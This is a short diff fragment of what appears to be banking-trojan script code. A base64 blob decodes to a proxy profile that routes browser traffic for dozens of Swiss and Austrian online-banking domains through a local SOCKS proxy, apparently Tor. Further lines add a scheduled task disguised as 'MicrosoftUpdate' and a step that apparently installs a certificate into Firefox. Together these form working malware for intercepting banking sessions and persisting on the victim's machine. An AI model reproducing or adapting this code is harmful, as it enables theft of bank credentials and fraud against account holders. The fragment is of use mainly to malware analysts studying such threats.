-Base64ToFile $d 'PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9InllcyI/Pg0KPFByb3hpZmllclByb2ZpbGUgdmVyc2lvbj0iMTAxIiBwbGF0Zm9ybT0iV2luZG93cyIgcHJvZHVjdF9pZD0iMSIgcHJvZHVjdF9taW52ZXI9IjMxMCI+DQogIDxPcHRpb25zPg0KICAgIDxSZXNvbHZlPg0KICAgICAgPEF1dG9Nb2RlRGV0ZWN0aW9uIGVuYWJsZWQ9ImZhbHNlIiAvPg0KICAgICAgPFZpYVByb3h5IGVuYWJsZWQ9InRydWUiPg0KICAgICAgICA8VHJ5TG9jYWxEbnNGaXJzdCBlbmFibGVkPSJmYWxzZSIgLz4NCiAgICAgIDwvVmlhUHJveHk+DQogICAgICA8RXhjbHVzaW9uTGlzdD4lQ29tcHV0ZXJOYW1lJTsgbG9jYWxob3N0OyAqLmxvY2FsPC9FeGNsdXNpb25MaXN0Pg0KICAgIDwvUmVzb2x2ZT4NCiAgICA8UHJveGlmaWNhdGlvblBvcnRhYmxlRW5naW5lIHN1YnN5c3RlbT0iMzIiPg0KICAgICAgPExvY2F0aW9uPkJhc2VQcm92aWRlcjwvTG9jYXRpb24+DQogICAgICA8VHlwZSBob3RwYXRjaD0idHJ1ZSI+UHJvbG9ndWU8L1R5cGU+DQogICAgPC9Qcm94aWZpY2F0aW9uUG9ydGFibGVFbmdpbmU+DQogICAgPFByb3hpZmljYXRpb25Qb3J0YWJsZUVuZ2luZSBzdWJzeXN0ZW09IjY0Ij4NCiAgICAgIDxMb2NhdGlvbj5CYXNlUHJvdmlkZXI8L0xvY2F0aW9uPg0KICAgICAgPFR5cGUgaG90cGF0Y2g9ImZhbHNlIj5Qcm9sb2d1ZTwvVHlwZT4NCiAgICA8L1Byb3hpZmljYXRpb25Qb3J0YWJsZUVuZ2luZT4NCiAgICA8RW5jcnlwdGlvbiBtb2RlPSJiYXNpYyIgLz4NCiAgICA8SHR0cFByb3hpZXNTdXBwb3J0IGVuYWJsZWQ9ImZhbHNlIiAvPg0KICAgIDxIYW5kbGVEaXJlY3RDb25uZWN0aW9ucyBlbmFibGVkPSJmYWxzZSIgLz4NCiAgICA8Q29ubmVjdGlvbkxvb3BEZXRlY3Rpb24gZW5hYmxlZD0idHJ1ZSIgLz4NCiAgICA8UHJvY2Vzc1NlcnZpY2VzIGVuYWJsZWQ9ImZhbHNlIiAvPg0KICAgIDxQcm9jZXNzT3RoZXJVc2VycyBlbmFibGVkPSJmYWxzZSIgLz4NCiAgPC9PcHRpb25zPg0KICA8UHJveHlMaXN0Pg0KICAgIDxQcm94eSBpZD0iMTAwIiB0eXBlPSJTT0NLUzUiPg0KICAgICAgPEFkZHJlc3M+MTI3LjAuMC4xPC9BZGRyZXNzPg0KICAgICAgPFBvcnQ+OTA1MDwvUG9ydD4NCiAgICAgIDxPcHRpb25zPjQ4PC9PcHRpb25zPg0KICAgIDwvUHJveHk+DQogIDwvUHJveHlMaXN0Pg0KICA8Q2hhaW5MaXN0IC8+DQogIDxSdWxlTGlzdD4NCiAgICA8UnVsZSBlbmFibGVkPSJ0cnVlIj4NCiAgICAgIDxOYW1lPkxvY2FsaG9zdDwvTmFtZT4NCiAgICAgIDxUYXJnZXRzPmxvY2FsaG9zdDsgMTI3LjAuMC4xOyAlQ29tcHV0ZXJOYW1lJTsgYXBpLmlwaWZ5Lm9yZzwvVGFyZ2V0cz4NCiAgICAgIDxBY3Rpb24gdHlwZT0iRGlyZWN0IiAvPg0KICAgIDwvUnVsZT4NCiAgICA8UnVsZSBlbmFibGVkPSJ0cnVlIj4NCiAgICAgIDxOYW1lPm1haW48L05hbWU+DQogICAgICA8QXBwbGljYXRpb25zPmZpcmVmb3guZXhlO2lleHBsb3JlLmV4ZTtjaHJvbWUuZXhlPC9BcHBsaWNhdGlvbnM+DQogICAgICA8VGFyZ2V0cz4qcG9zdGZpbmFuY2UuY2g7Y3MuZGlyZWN0bmV0LmNvbTtlYi5ha2IuY2g7Ki51YnMuY29tO3RiLnJhaWZmZWlzZW5kaXJlY3QuY2g7Ki5ia2IuY2g7Ki5sdWtiLmNoOyouemtiLmNoOyoub25iYS5jaDtlLWJhbmtpbmcuZ2tiLmNoOyouYmVrYi5jaDt3d3dzZWMuZWJhbmtpbmcuenVnZXJrYi5jaDtuZXRiYW5raW5nLmJjZ2UuY2g7Ki5yYWlmZmVpc2VuLmNoOyouY3JlZGl0LXN1aXNzZS5jb207Ki5iYW5rYXVzdHJpYS5hdDsqLmJhd2FncHNrLmNvbTsqLnJhaWZmZWlzZW4uYXQ7Ki5zdGF0aWMtdWJzLmNvbTsqLmJhd2FnLmNvbTsqLmNsaWVudGlzLmNoO2NsaWVudGlzLmNoOypiY3ZzLmNoOypjaWMuY2g7d3d3LmJhbmtpbmcuY28uYXQ7Km9iZXJiYW5rLmF0O3d3dy5vYmVyYmFuay1iYW5raW5nLmF0OypiYWxvaXNlLmNoOyoudWtiLmNoO3Vya2IuY2g7Ki51cmtiLmNoOyouZWVrLmNoOypzemtiLmNoOypzaGtiLmNoOypnbGtiLmNoOypua2IuY2g7Km93a2IuY2g7KmNhc2guY2g7KmJjZi5jaDsqLmVhc3liYW5rLmF0O2ViYW5raW5nLnJhaWZmZWlzZW4uY2g7Ki5vbmlvbjsqYmN2LmNoOypqdWxpdXNiYWVyLmNvbTsqYWJzLmNoOypiY24uY2g7KmJsa2IuY2g7KmJjai5jaDsqenVlcmNoZXJsYW5kYmFuay5jaDsqdmFsaWFudC5jaDsqd2lyLmNoPC9UYXJnZXRzPg0KICAgICAgPEFjdGlvbiB0eXBlPSJQcm94eSI+MTAwPC9BY3Rpb24+DQogICAgPC9SdWxlPg0KICAgIDxSdWxlIGVuYWJsZWQ9InRydWUiPg0KICAgICAgPE5hbWU+RGVmYXVsdDwvTmFtZT4NCiAgICAgIDxBY3Rpb24gdHlwZT0iRGlyZWN0IiAvPg0KICAgIDwvUnVsZT4NCiAgPC9SdWxlTGlzdD4NCjwvUHJveGlmaWVyUHJvZmlsZT4=';
-AddTask 'MicrosoftUpdate' $p '' 1;
-}
-InstallTP
+AddCertFF
